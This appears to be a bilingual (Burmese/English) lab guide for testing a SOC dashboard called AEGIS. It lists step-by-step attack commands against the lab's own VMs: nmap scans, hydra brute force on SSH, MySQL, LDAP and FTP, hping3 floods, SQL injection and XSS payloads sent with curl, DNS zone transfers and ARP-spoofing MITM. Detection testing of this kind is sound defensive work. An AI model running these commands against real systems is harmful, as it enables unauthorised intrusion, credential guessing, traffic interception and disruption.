# AEGIS — Attack Testing Guide (Step by Step)

> မှတ်တမ်း — ဒီ document က real lab မှာ attack test လုပ်ဖို့ step-by-step commands အားလုံးကို မှတ်တမ်းတင်ထားသည်။
>
> **Setup:** Kali Linux (attacker) → Ubuntu VM (defender) → AEGIS Dashboard (monitor)

---

## Lab IP Reference (v4 Final)

| Device | IP | Role |
|---|---|---|
| Kali Linux | `192.168.10.x` (DHCP) | Attacker |
| company-web-server | `10.10.10.10` | Apache2, Fail2ban, SSH |
| company-dns-server | `10.10.10.20` | BIND9, Fail2ban, SSH |
| company-customer-db | `10.20.20.10` | MySQL, Fail2ban, SSH |
| company-ldap-server | `10.20.20.20` | OpenLDAP, Fail2ban, SSH |
| aegis-company-admin | `10.30.30.10` | forwarder hub |
| AEGIS Dashboard | https://aegis-soc-dashboard.vercel.app | Monitor only |
| AEGIS API | https://aegis-api-server-jp3b.onrender.com | Ingest + Commands |

---

## Pre-flight Checklist

```bash
# Kali ရဲ့ IP address စစ်
ip a show eth0 | grep "inet "
# ip a      : ip address subcommand (ifconfig alternative)
# show eth0 : eth0 interface ကိုသာ ပြ
# grep "inet " : IPv4 line ကိုသာ filter (inet6 မပါစေဖို့ space ပါ)

# Kali မှာ lab route ရှိမရှိ စစ်
ip route | grep "10.0.0.0"

# မရှိရင် ထည့်
sudo ip route add 10.0.0.0/8 via 192.168.10.1
#   10.0.0.0/8   → 10.x.x.x ကြားဆက်ကြောင်း
#   via 192.168.10.1 → Router ether2 (gateway) ကတဆင့်

# Connectivity check
ping -c2 10.10.10.10   # company-web-server
ping -c2 10.10.10.20   # company-dns-server
ping -c2 10.20.20.10   # company-customer-db
ping -c2 10.20.20.20   # company-ldap-server

# Password file တွေ create
printf 'WrongPass-01\nWrongPass-02\nWrongPass-03\nWrongPass-04\nWrongPass-05\n' > /tmp/lab-ssh.txt
printf 'WrongDB-01\nWrongDB-02\nWrongDB-03\nWrongDB-04\nWrongDB-05\n'         > /tmp/lab-db.txt
printf 'WrongLDAP-01\nWrongLDAP-02\nWrongLDAP-03\nWrongLDAP-04\nWrongLDAP-05\n' > /tmp/lab-ldap.txt
```

---

## STEP 1 — Port Scan → `port_scan`

```bash
# SYN scan (stealth) — Suricata "ET SCAN Nmap -sS" rule trigger
sudo nmap -sS -T3 -p 21,22,23,25,53,80,110,139,443,445,3306,389 10.10.10.10
#        ↑      ↑   ↑
#        │      │   └─ -p : စစ်မည့် port နံပါတ်များ (comma ဖြင့် ခြားထားသည်)
#        │      └───── -T3 : Timing template 3 = Normal အမြန်နှုန်း (0=slowest, 5=fastest)
#        └──────────── -sS : SYN scan — TCP handshake မပြီးဘဲ SYN packet ပဲပို့ (stealth)

# NULL scan — flag အားလုံး 0 — firewall bypass စမ်း
sudo nmap -sN -p 22,80,443 10.10.10.10
#        ↑
#        └── -sN : NULL scan — TCP flag တစ်ခုမှ set မလုပ်ဘဲ packet ပို့

# FIN scan
sudo nmap -sF -p 22,80,443 10.10.10.10
#        ↑
#        └── -sF : FIN scan — FIN flag ပဲပို့ (connection close request)

# XMAS scan — FIN+PSH+URG တစ်ချိန်တည်း
sudo nmap -sX -p 22,80,443 10.10.10.10
#        ↑
#        └── -sX : XMAS scan — flag သုံးခု တစ်ပြိုင်နက် light up (xmas tree နှင့်တူ)

# Version detection scan — service name + version ရှာ
sudo nmap -sV -T3 -p 3306,22 10.20.20.10
#        ↑
#        └── -sV : Service Version detection — port ဖွင့်ထားသော service ၏ version စစ်

# DNS server scan
sudo nmap -sS -T3 -p 53,22 10.10.10.20
#                    ↑
#                    └── port 53 : DNS standard port (TCP/UDP) — zone transfer request ကို TCP ကသုံး

# LDAP server scan
sudo nmap -sV -T3 -p 389,636,22 10.20.20.20
#                    ↑   ↑
#                    │   └── 636 = LDAPS (LDAP over TLS)
#                    └────── 389 = LDAP standard port
```

**Dashboard မှာ မြင်ရမည်:** Security Events → `port_scan`

---

## STEP 2 — SSH Brute Force → `ssh_brute` + auto-block

```bash
# company-web-server SSH brute
hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.10.10.10
#     ↑           ↑                  ↑    ↑   ↑
#     │           │                  │    │   └── -f : valid credential တွေ့သည်နှင့် ရပ်
#     │           │                  │    └────── -W 3 : connection ကြား 3 စက္ကန့် စောင့်
#     │           │                  └─────────── -t 1 : တစ်ချိန်တည်း connection တစ်ခုပဲ
#     │           └────────────────────────────── -P : Password list file (uppercase = file)
#     └────────────────────────────────────────── -l : login username တစ်ယောက်တည်း (lowercase)

# company-dns-server SSH brute
hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.10.10.20
# ↑ web-server နှင့် flag အတူတူ — target IP ကိုသာ 10.10.10.20 (DNS server) ပြောင်း

# company-customer-db SSH brute
hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.20.20.10
# ↑ target IP 10.20.20.10 (MySQL DB server) — SSH port 22 ကို brute

# company-ldap-server SSH brute
hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.20.20.20
# ↑ target IP 10.20.20.20 (LDAP server) — SSH service ကို brute
```

**Dashboard မှာ မြင်ရမည်:** SSH Sessions tab + Active Alerts → HIGH + Defense Center → auto-block

---

## STEP 3 — DDoS / SYN Flood → `ddos`

```bash
# SYN flood — safe (30 packet ပဲ)
sudo hping3 -S -p 80 -c 30 -i u100000 10.10.10.10
#           ↑  ↑     ↑     ↑
#           │  │     │     └── -i u100000 : interval = 100,000 microsecond = 100ms ကြားနား
#           │  │     └──────── -c 30      : count = packet 30 ခုပဲပို့ပြီး ရပ်
#           │  └────────────── -p 80      : destination port 80 (HTTP)
#           └───────────────── -S         : SYN flag set လုပ်ထားသော TCP packet

# ICMP flood (ping flood)
sudo hping3 --icmp -c 30 -i u100000 10.10.10.10
#           ↑
#           └── --icmp : ICMP mode (ping packet အနေနဲ့ ပို့)

# UDP flood — DNS port
sudo hping3 --udp -p 53 -c 30 -i u100000 10.10.10.20
#           ↑
#           └── --udp : UDP mode
```

**Dashboard မှာ မြင်ရမည်:** Security Events → `ddos`

---

## STEP 4 — Web Attack (SQLi / XSS) → `web_attack` → HTTP tab

```bash
# SQL Injection — UNION based
curl -si --max-time 5 --get \
  --data-urlencode "id=1' UNION SELECT 1,2,3--" \
  http://10.10.10.10/
#  ↑   ↑            ↑    ↑
#  │   │            │    └── --data-urlencode : data ကို URL-encode လုပ်ပြီး GET request မှာ ထည့်
#  │   │            │         (space, quote, -- တွေ auto-escape ဖြစ်)
#  │   │            └──────── --get           : HTTP GET method သုံး
#  │   └────────────────────── --max-time 5   : 5 စက္ကန့် အကြာ timeout
#  └────────────────────────── -si            : -s (silent/progress မပြ) + -i (response header ပါ ပြ)

# SQL Injection — OR based
curl -si --max-time 5 --get \
  --data-urlencode "id=1' OR '1'='1" \
  http://10.10.10.10/login
# ↑ payload: OR '1'='1 → condition အမြဲ true ဖြစ်အောင် — login bypass technique
#   /login endpoint ကို target — credential မပါဘဲ authenticate ဝင်ကြိုး

# XSS (Cross-Site Scripting)
curl -si --max-time 5 --get \
  --data-urlencode "q=<script>alert('aegis-test')</script>" \
  http://10.10.10.10/
# ↑ payload: <script>alert()</script> → browser မှာ execute ဖြစ်ရင် XSS အတည် 
#   q= parameter ကတဆင့် inject — server က sanitize မလုပ်ရင် Suricata ဖမ်းမည်

# Nikto web vulnerability scan
nikto -h http://10.10.10.10 -maxtime 1m -Pause 1
#     ↑                     ↑           ↑
#     │                     │           └── -Pause 1 : request ကြား 1 စက္ကန့် နားမည်
#     │                     └────────────── -maxtime : scan အများဆုံး 1 minute ပဲ run မည်
#     └──────────────────────────────────── -h       : target host URL
```

> ⚠️ ဒီ attacks တွေ → **HTTP Attacks tab** မှာ ပေါ်မည် (DB tab မဟုတ်ဘူး)
> Suricata က HTTP layer ကသာ detect လုပ်တာ၊ MySQL protocol layer မဟုတ်ဘူး

---

## STEP 5 — DNS Attack → `dns_attack` → DNS tab

### ⚠️ VM Pre-requisite: BIND9 Query Logging ဖွင့်ရမည် (တစ်ကြိမ်ပဲ)

```bash
# company-dns-server မှာ SSH ဝင်ပြီး run
ssh labtest@10.10.10.20

sudo mkdir -p /var/log/named
sudo chown bind:bind /var/log/named   # bind user ကို log folder ပိုင်ဆိုင်ခွင့်ပေး

sudo tee -a /etc/bind/named.conf.local <<'EOF'
logging {
    channel q_log {
        file "/var/log/named/named.log" versions 3 size 10m;
        #                              ↑           ↑
        #                              │           └── size 10m : file 10MB ကျော်ရင် rotate
        #                              └────────────── versions 3 : log file 3 ခုသာ သိမ်း
        severity dynamic;
        print-time yes;   # timestamp ပြ
    };
    category queries { q_log; };   # query events → ဒီ channel ကို ရေး
    category default { q_log; };
};
EOF

sudo systemctl restart bind9
sudo tail -f /var/log/named/named.log   # log ထွက်မလာ စစ်
exit
```

### Kali မှာ run

```bash
# Zone Transfer (AXFR) — HIGH severity alert
dig AXFR goldenmyanmar.trading.com @10.10.10.20
#   ↑                               ↑
#   │                               └── @IP : ဒီ DNS server ကိုတိုက်ရိုက် query (system DNS မဟုတ်)
#   └── AXFR : Authoritative Zone Transfer — zone record အားလုံး download ရန် request

# nmap DNS zone transfer script
sudo nmap -p 53 --script dns-zone-transfer \
  --script-args dns-zone-transfer.domain=goldenmyanmar.trading.com \
  10.10.10.20
#  ↑             ↑
#  │             └── --script-args : script ထဲ pass မည့် argument
#  └── --script dns-zone-transfer  : NSE script ရွေး (zone transfer စမ်း)

# DNS flood — 25 queries in 60s → flood detect trigger
for i in $(seq 1 25); do
  dig +time=1 +tries=1 @10.10.10.20 goldenmyanmar.trading.com A >/dev/null
  # +time=1  : DNS response timeout 1 second
  # +tries=1 : retry 1 ကြိမ်ပဲ
  # A        : IPv4 address record
  # >/dev/null : output မပြဘဲ ပစ်ချ
  sleep 0.2
done

# DNS refused query flood — 10 nonexistent domains
for i in $(seq 1 10); do
  dig +time=1 +tries=1 @10.10.10.20 nonexistent${i}.goldenmyanmar.trading.com
  sleep 0.5
done
```

**Dashboard မှာ မြင်ရမည်:** Connection Logs → DNS tab → `dns_zone_transfer` (HIGH) / `dns_query_refused` (MEDIUM)

---

## STEP 6 — MySQL / DB Attack → `db_attack` → DB tab

### ⚠️ VM Pre-requisite: MySQL Error Log Verbosity ဖွင့်ရမည် (တစ်ကြိမ်ပဲ)

```bash
# company-customer-db မှာ SSH ဝင်ပြီး run
ssh labtest@10.20.20.10

sudo tee -a /etc/mysql/mysql.conf.d/mysqld.cnf <<'EOF'
log_error            = /var/log/mysql/error.log
log_error_verbosity  = 3
# log_error_verbosity 3 = errors + warnings + notes (auth failure ပါ ထွက်မည်)
EOF

sudo systemctl restart mysql
sudo tail -f /var/log/mysql/error.log   # "Access denied" line ပေါ်မလာ စစ်
exit
```

### Kali မှာ run

```bash
# MySQL brute force (hydra)
hydra -l gmuser -P /tmp/lab-db.txt -t 1 -W 3 -f mysql://10.20.20.10
#     ↑          ↑                             ↑
#     │          │                             └── mysql:// : MySQL protocol
#     │          └────────────────────────────── -P : password list file
#     └────────────────────────────────────────── -l : MySQL username (gmuser)

# nmap MySQL port scan
sudo nmap -sV -T3 -p 3306 10.20.20.10
#                    ↑
#                    └── 3306 : MySQL default port

# Direct mysql client test (connection error ပေါ်ရမည်)
mysql -h 10.20.20.10 -u gmuser -pWrongDB-01 goldenmyanmardb 2>&1
#     ↑               ↑         ↑
#     │               │         └── -p : password (붙여서 -pPassword123)
#     │               └──────────── -u : username
#     └──────────────────────────── -h : host IP
```

**Dashboard မှာ မြင်ရမည်:** Connection Logs → DB tab → `Auth Brute`

---

## STEP 7 — LDAP Attack → `ldap_attack` → LDAP tab

### ⚠️ VM Pre-requisite: slapd Logging ဖွင့်ရမည် (တစ်ကြိမ်ပဲ)

```bash
# company-ldap-server မှာ SSH ဝင်ပြီး run
ssh labtest@10.20.20.20

sudo ldapmodify -Y EXTERNAL -H ldapi:/// <<'EOF'
#               ↑            ↑
#               │            └── -H ldapi:/// : local Unix socket (TCP မဟုတ်)
#               └── -Y EXTERNAL : SASL EXTERNAL mechanism = root ကတဆင့် local auth
dn: cn=config
changetype: modify
replace: olcLogLevel
olcLogLevel: 256
# 256 = connections log (ACCEPT/BIND/RESULT lines ထွက်မည်)
# 1   = trace, 256+1 = connections + trace
EOF

sudo systemctl restart rsyslog
sudo tail -f /var/log/syslog | grep slapd   # slapd entries ပေါ်မလာ စစ်
exit
```

### Kali မှာ run

```bash
# LDAP brute force (hydra) — err=49 trigger
hydra \
  -l "cn=admin,dc=goldenmyanmar,dc=trading,dc=com" \
  -P /tmp/lab-ldap.txt \
  -t 1 -W 3 -f \
  ldap://10.20.20.20
# ldap:// : LDAP protocol (port 389)
# -l      : bind DN အပြည့်အစုံ (LDAP username format)

# ldapsearch wrong password — err=49 (Invalid credentials)
ldapsearch -H ldap://10.20.20.20 \
  -x \
  -D "cn=admin,dc=goldenmyanmar,dc=trading,dc=com" \
  -w WrongPass-01 \
  -b "dc=goldenmyanmar,dc=trading,dc=com"
#  ↑   ↑              ↑   ↑                ↑
#  │   │              │   │                └── -b : search base DN (ဘယ် level အောက် search မည်)
#  │   │              │   └───────────────── -w : bind password (plain text)
#  │   │              └───────────────────── -D : bind DN (login ဖို့ DN)
#  │   └──────────────────────────────────── -x : simple authentication (SASL မဟုတ်)
#  └──────────────────────────────────────── -H : LDAP host URI

# DN enumeration — err=32 (No such object)
for n in 1 2 3 4 5; do
  ldapsearch -x -H ldap://10.20.20.20 \
    -b "ou=missing${n},dc=goldenmyanmar,dc=trading,dc=com" \
    -s base \
    "(objectClass=*)" dn
    # -s base     : scope = base object ခုပဲ ကြည့် (subtree မကြည့်)
    # -b ou=...   : မရှိတဲ့ OU → err=32 trigger
  sleep 1
done

# nmap LDAP brute script
sudo nmap -sV -p 389 \
  --script ldap-brute \
  --script-args ldap.base="dc=goldenmyanmar,dc=trading,dc=com" \
  10.20.20.20
#  ↑                          ↑
#  │                          └── ldap.base : search base DN (script argument)
#  └── --script ldap-brute    : NSE script — LDAP credential brute force
```

**Dashboard မှာ မြင်ရမည်:** Connection Logs → LDAP tab → `Auth Brute` / `Enum`

---

## STEP 8 — FTP Attack

```bash
# FTP brute force
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
#     ↑              ↑                                  ↑
#     │              │                                  └── ftp:// : FTP protocol (port 21)
#     │              └─────────────────────────────────── -P : rockyou password list
#     └────────────────────────────────────────────────── -l : FTP username

# FTP banner grab (version စစ်)
sudo nmap -sV -p 21 10.10.10.10
#              ↑
#              └── port 21 : FTP standard port
```

---

## STEP 9 — ARP Spoofing / MITM

```bash
# ARP spoofing
sudo arpspoof -i eth0 -t 10.10.10.10 10.10.10.1
#             ↑        ↑              ↑
#             │        │              └── gateway IP (spoof မည့် IP)
#             │        └───────────────── -t : target (victim IP)
#             └────────────────────────── -i : network interface

# ettercap MITM
sudo ettercap -T -M arp:remote /10.10.10.10// /10.10.10.1//
#             ↑  ↑
#             │  └── -M arp:remote : ARP poisoning MITM mode
#             └───── -T            : text mode (GUI မဟုတ်)
```

---

## STEP 10 — TLS / SSL Weak Cipher Test

```bash
# Weak cipher connect test
openssl s_client -connect 10.10.10.10:443 -cipher NULL-MD5
#                ↑                         ↑
#                │                         └── -cipher : သုံးမည့် cipher suite ရွေး
#                └── -connect host:port    : TLS connection target

# SSL scan (ရနိုင်သော cipher / protocol အားလုံး)
sslscan 10.10.10.10:443
```

---

## After Each Attack — Unblock Commands

```bash
# Dashboard မှ unblock (easiest)
# Defense Center → Active Blocks → Kali IP → "Unblock" button

# API မှ unblock
curl -X DELETE https://aegis-api-server-jp3b.onrender.com/api/defense/block/KALI_IP \
  -H "X-AEGIS-Admin-Key: YOUR_ADMIN_KEY"
#  ↑                                      ↑
#  │                                      └── X-AEGIS-Admin-Key : admin endpoint auth header
#  └── -X DELETE : HTTP DELETE method

# Ubuntu VM မှာ iptables ကိုယ်တိုင် ဖြုတ်
sudo iptables -D INPUT -s KALI_IP -j DROP
#             ↑         ↑          ↑
#             │         │          └── -j DROP : packet drop action
#             │         └──────────── -s KALI_IP : source IP filter
#             └────────────────────── -D INPUT   : DELETE rule from INPUT chain

sudo fail2ban-client set sshd unbanip KALI_IP
#                    ↑   ↑   ↑
#                    │   │   └── unbanip : IP ကို ban list မှ ဖယ်
#                    │   └────── sshd    : jail name
#                    └────────── set     : jail setting ပြင်
```

---

## Manual Ingest Test (VM မလိုဘဲ simulate)

```bash
# Port scan simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/suricata \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","dest_ip":"10.10.10.10","alert":{"signature":"ET SCAN Nmap -sS SYN Scan","severity":2},"proto":"TCP","event_type":"alert"}'
# -X POST           : HTTP POST method
# -H "Content-Type" : request body က JSON ဖြစ်ကြောင်း server ကိုပြော
# -H "X-AEGIS-Key"  : ingest auth header
# -d '{...}'        : request body (JSON data)

# SSH brute force simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/ssh \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","username":"root","status":"failed","failures":6,"targetHost":"10.10.10.10"}'

# DDoS simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/suricata \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","dest_ip":"10.10.10.10","alert":{"signature":"ET DOS SYN flood","severity":1},"proto":"TCP","event_type":"alert"}'

# DNS zone transfer simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/dns \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","target_ip":"10.10.10.20","attack_type":"dns_zone_transfer","query":"goldenmyanmar.trading.com","severity":"high"}'

# MySQL brute force simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/mysql \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","target_ip":"10.20.20.10","attack_type":"Auth Brute","username":"gmuser","severity":"high"}'

# LDAP brute force simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/ldap \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","target_ip":"10.20.20.20","attack_type":"Auth Brute","dn":"cn=admin,dc=goldenmyanmar,dc=trading,dc=com","error_code":49,"severity":"high"}'
```

---

## Summary — ဘာ run မှ ဘာ ဝင်မလဲ

| Attack | Tool | Dashboard tab | VM config လိုသည် |
|---|---|---|---|
| Port scan | nmap -sS | Security Events → port_scan | မလို |
| SSH brute | hydra ssh:// | SSH Sessions + auto-block | မလို |
| DDoS | hping3 -S | Security Events → ddos | မလို |
| Web SQLi/XSS | curl / nikto | HTTP Attacks | မလို |
| DNS zone transfer | dig AXFR | DNS Attacks | BIND9 logging ✅ |
| DNS flood | for+dig loop | DNS Attacks | BIND9 logging ✅ |
| MySQL brute | hydra mysql:// | DB Attacks | MySQL log verbosity ✅ |
| LDAP brute | hydra ldap:// | LDAP Attacks | slapd loglevel 256 ✅ |

---

*Last updated: 2026-07-26 (explanations added for all commands) | AEGIS SOC Dashboard — Attack Testing Reference*
